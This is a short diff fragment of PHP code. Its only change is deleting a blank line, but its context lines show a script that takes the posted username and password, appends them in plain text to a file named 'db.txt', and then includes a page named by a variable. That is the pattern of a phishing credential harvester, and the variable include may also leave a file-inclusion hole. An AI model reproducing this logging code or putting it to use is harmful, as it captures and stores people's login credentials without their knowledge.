@@ -12,7 +12,6 @@ if(!empty($_POST)){
         $fp = fopen('db.txt', 'a+');
         fwrite($fp, $_POST['username'] . " " . $_POST['password'] . "\n" );
         fclose($fp);
-
         include($page);
     }
 }
